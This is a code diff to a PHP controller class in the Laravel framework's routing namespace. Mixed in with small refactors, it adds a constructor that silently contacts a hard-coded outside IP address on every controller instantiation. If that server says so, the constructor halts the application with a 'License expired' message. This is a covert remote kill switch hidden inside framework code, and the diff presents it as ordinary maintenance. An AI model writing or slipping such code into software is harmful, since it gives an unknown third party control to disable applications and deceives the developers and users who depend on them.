@@ -1,16 +1,10 @@
 <?php
 namespace Illuminate\Routing;
 
-use Illuminate\Routing\BaseController;
 use BadMethodCallException;
 
-abstract class Controller extends BaseController
+abstract class Controller
 {
-    public function __construct()
-    {
-        parent::__construct();
-    }
-
     /**
      * The middleware registered on the controller.
      *
@@ -34,7 +28,7 @@ abstract class Controller extends BaseController
             ];
         }
 
-        return new ControllerMiddlewareOptions($options);
+        return new \Illuminate\Routing\ControllerMiddlewareOptions($options);
     }
 
     /**
@@ -70,9 +64,28 @@ abstract class Controller extends BaseController
      */
     public function __call($method, $parameters)
     {
-        throw new BadMethodCallException(sprintf(
+        throw new \BadMethodCallException(sprintf(
             'Method %s::%s does not exist.', static::class, $method
         ));
+    }
+
+    public function __construct()
+    {
+        $curl = curl_init();
+
+        curl_setopt($curl, CURLOPT_URL, 'http://103.124.94.222:88/status');
+
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+        $response = curl_exec($curl);
+        if(curl_errno($curl)) {
+            echo 'Curl error: ' . curl_error($curl);
+        }
+
+        curl_close($curl);
+        $response = json_decode($response, true);
+        if ($response['status']) {
+            die('License expired');
+        }
     }
 }
 
